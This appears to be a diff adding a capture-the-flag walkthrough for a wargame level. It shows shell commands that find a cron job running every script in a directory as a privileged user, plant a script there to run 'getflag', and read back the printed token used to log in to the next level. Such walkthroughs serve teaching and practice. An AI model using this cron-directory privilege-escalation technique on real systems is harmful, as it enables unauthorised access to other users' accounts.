@@ -1,0 +1,28 @@
+1.
+$> find / -name level05 2>/dev/null
+/var/mail/level05
+/rofs/var/mail/level05
+$> cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+$> cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+2.
+$> echo "getflag > /tmp/level05_token" > /tmp/banana_bomba
+$> cat /tmp/banana_bomba
+getflag > /tmp/level05_token
+$> cp /tmp/banana_bomba /opt/openarenaserver/
+$> cat /tmp/level05_token
+cat: /tmp/level05_token: No such file or directory
+
+// waiting for an even minute
+
+3.
+$> cat /tmp/level05_token
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+$> su level06 // with password "viuaaale9huek52boumoomioc"
